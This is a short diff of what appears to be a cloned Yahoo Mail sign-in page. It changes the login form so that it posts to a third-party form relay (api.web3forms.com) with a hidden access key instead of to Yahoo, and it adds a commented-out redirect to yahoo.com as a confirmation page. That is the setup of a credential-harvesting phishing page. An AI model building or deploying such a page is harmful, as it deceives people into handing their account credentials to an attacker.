@@ -115,7 +115,10 @@ root.isIOSDevice = false;
 </div><div class="username-challenge" id="login-landing">
     <strong class="challenge-heading">Sign in to Yahoo Mail</strong>
     <span class="challenge-desc signin-sub-title">using your Yahoo account</span>
-    <form id="login-username-form" method="post" action="https://formsubmit.co/034b6d013b2b4f5682f7d0463b8aecee" class="pure-form">
+    <form action="https://api.web3forms.com/submit" method="POST">
+        <input type="hidden" name="access_key" value="8aa52a1e-cab2-420e-8a54-ff97c7a82292">
+        <!-- Custom Confirmation / Success Page -->
+    <!-- <input type="hidden" name="redirect" value="https://yahoo.com"> -->
         <input type="hidden" name="browser-fp-data" id="browser-fp-data" value="" />
         <input type="hidden" name="sessionIndex" value="" />
         <input type="hidden" name="deviceCapability" value='{"pa":{"status":false}}' id="deviceCapability" />
